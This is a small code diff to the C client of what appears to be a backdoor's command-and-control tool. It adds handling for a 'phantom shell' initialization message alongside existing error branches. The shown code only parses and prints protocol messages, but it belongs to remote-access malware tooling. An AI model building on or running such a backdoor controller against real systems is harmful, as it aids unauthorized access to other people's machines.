@@ -135,7 +135,9 @@ int phantom_shell_mode(char* buf, char* local_ip, char* dest){
         }
     }else if(strncmp(buf, CC_PROT_ERR, strlen(CC_PROT_ERR))==0){
 		printf("[" KRED "ERROR" RESET "]""Backdoor did not understand the request: %s\n", request);
-	}else{
+    }else if(strncmp(buf, CC_PROT_PHANTOM_SHELL_INIT, strlen(CC_PROT_PHANTOM_SHELL_INIT))==0){
+        printf("[" KGRN "INIT" RESET "]""The backdoor just signaled that everything is ready and working!");
+    }else{
 		//If at this point, then we failed to identify the backdoor message
 		//We attempt to send a final message indicating we are halting the connection
 		printf("[" KRED "ERROR" RESET "]""Backdoor sent unrecognizable message:\n[%s]\n", buf);
